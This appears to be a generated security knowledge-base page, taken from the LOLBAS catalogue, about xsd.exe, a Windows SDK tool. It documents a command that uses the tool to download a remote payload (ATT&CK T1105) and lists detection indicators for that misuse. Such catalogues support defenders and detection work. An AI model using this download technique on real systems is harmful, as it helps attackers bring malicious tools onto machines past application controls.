---
title: "xsd.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/xsd.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/xsd.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "xsd.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# xsd.exe

XML Schema Definition Tool included with the Windows Software Development Kit (SDK).

## Metadata

- Category: OtherMSBinaries
- Created: 2024-04-09
- Author: Avihay Eldad
- Source Path: yml/OtherMSBinaries/xsd.yml

## Paths

- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe`

## Commands

### 1. Download

Downloads payload from remote server

```cmd
xsd.exe {REMOTEURL}
```

- Use Case: It will download a remote payload and place it in INetCache
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- IOC: URL on a xsd.exe command line
- IOC: xsd.exe making unexpected network connections or DNS requests

## Acknowledgements

- {'Person': 'Avihay Eldad', 'Handle': '@AvihayEldad'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/xsd.yml)
